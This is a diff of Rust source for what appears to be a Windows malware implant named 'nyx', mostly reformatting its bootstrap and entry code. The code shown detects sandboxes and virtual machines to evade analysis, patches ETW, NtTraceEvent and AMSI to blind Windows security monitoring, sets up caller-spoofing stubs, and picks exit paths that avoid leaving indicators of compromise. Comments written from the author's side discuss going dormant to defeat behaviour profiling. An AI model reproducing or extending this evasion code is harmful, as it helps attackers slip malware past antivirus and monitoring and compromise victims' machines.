@@ -61,7 +61,11 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
                     type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
                     let f: FnGetEnv = core::mem::transmute(addr);
                     let mut buf = [0u8; 2];
-                    let n = f(b"NYX_SKIP_SANDBOX\0".as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
+                    let n = f(
+                        b"NYX_SKIP_SANDBOX\0".as_ptr(),
+                        buf.as_mut_ptr(),
+                        buf.len() as u32,
+                    );
                     n == 1 && buf[0] == b'1'
                 })
                 .unwrap_or(false)
@@ -69,10 +73,12 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         env_skip || cfg!(nyx_skip_sandbox)
     };
 
-    if !skip_sandbox && matches!(
-        unsafe { crate::envprobe::looks_like_analysis_env() },
-        crate::envprobe::EnvVerdict::AnalysisEnv
-    ) {
+    if !skip_sandbox
+        && matches!(
+            unsafe { crate::envprobe::looks_like_analysis_env() },
+            crate::envprobe::EnvVerdict::AnalysisEnv
+        )
+    {
         // VM/sandbox detected → bail out. A production implant may instead
         // drop to a dormant ultra-low-frequency cycle here to defeat
         // behavior profiling; for now we treat it the same as a failed
@@ -146,7 +152,9 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // ---- Countermeasure init (proxy gadgets, caller-spoof stubs, CFG probe) --
     // Run BEFORE blind (VEH registration) so proxy gadgets and caller-spoof
     // stubs are available when add_hwbp registers the first VEH handler.
-    unsafe { crate::blind_hwbp::init_countermeasures(); }
+    unsafe {
+        crate::blind_hwbp::init_countermeasures();
+    }
     diag_mark(b"4b_countermeasures");
 
     // BLIND: HWBP → byte-patch fallback
@@ -161,12 +169,14 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     }
     if !hwbp_ok {
         let etw_r = crate::blind::patch_etw();
-        let nt_r  = crate::blind::patch_nt_trace_event();
+        let nt_r = crate::blind::patch_nt_trace_event();
         let amsi_r = crate::blind::patch_amsi();
         let all_ok = etw_r.is_ok() && nt_r.is_ok() && amsi_r.is_ok();
         crate::blind::BLIND_OK.store(all_ok, core::sync::atomic::Ordering::Release);
         if !all_ok {
-            unsafe { crate::blind::BLIND_ERR = etw_r.err().or(nt_r.err()).or(amsi_r.err()); }
+            unsafe {
+                crate::blind::BLIND_ERR = etw_r.err().or(nt_r.err()).or(amsi_r.err());
+            }
         }
     } else {
         crate::blind::BLIND_OK.store(true, core::sync::atomic::Ordering::Release);
@@ -243,14 +253,23 @@ pub fn csprng_fill(buf: &mut [u8]) -> bool {
 pub unsafe extern "system" fn nyx_entry() {
     let Some(_ntdll) = bootstrap() else {
         // Bootstrap failed (ntll not found or sandbox detected). Exit cleanly
-        // rather than spin-looping — a hanging process is a worse IOC than a
-        // crashed one.
+        // rather than spin-looping — a 100% CPU spin is a loud IOC. Try, in
+        // order: ExitProcess → NtTerminateProcess → int3 trap. No infinite loops.
         if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
             let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
             f(0xFFFF_FFFE);
         }
-        loop {
-            core::hint::spin_loop();
+        // ExitProcess unresolved — fall back to NtTerminateProcess (ntdll).
+        core::hint::spin_loop();
+        if let Some(nt) = crate::resolve::export_addr(b"ntdll.dll", b"NtTerminateProcess") {
+            // NtTerminateProcess(Handle, Status) -> NTSTATUS. -1 = current process.
+            type NtTerminateProcess = unsafe extern "system" fn(usize, i32) -> i32;
+            let f: NtTerminateProcess = core::mem::transmute(nt);
+            f(0xFFFF_FFFF_FFFF_FFFF, 0);
+        }
+        // Last resort: int3 trap — quieter than an infinite spin loop.
+        unsafe {
+            core::arch::asm!("int3", options(noreturn));
         }
     };
     diag_mark(b"8_before_loop");
@@ -310,8 +329,17 @@ unsafe fn exit_in_entry(code: u32) -> ! {
 pub fn diag_mark(mark: &[u8]) {
     unsafe {
         use core::ffi::c_void;
-        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
-        type WriteFileFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+        type CreateFileAFn = unsafe extern "system" fn(
+            *const u8,
+            u32,
+            u32,
+            *mut c_void,
+            u32,
+            u32,
+            *mut c_void,
+        ) -> *mut c_void;
+        type WriteFileFn =
+            unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
         type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
 
         let cfa = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") {
@@ -348,13 +376,27 @@ pub fn diag_mark(mark: &[u8]) {
         path[i] = 0; // NUL terminator
 
         // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
-        let h = create(path.as_ptr(), 0x40000000, 2, core::ptr::null_mut(), 2, 0, core::ptr::null_mut());
+        let h = create(
+            path.as_ptr(),
+            0x40000000,
+            2,
+            core::ptr::null_mut(),
+            2,
+            0,
+            core::ptr::null_mut(),
+        );
         if h.is_null() || h as usize == usize::MAX {
             return;
         }
         let data = b"ok";
         let mut written: u32 = 0;
-        write(h, data.as_ptr(), data.len() as u32, &mut written, core::ptr::null_mut());
+        write(
+            h,
+            data.as_ptr(),
+            data.len() as u32,
+            &mut written,
+            core::ptr::null_mut(),
+        );
         close(h);
     }
 }
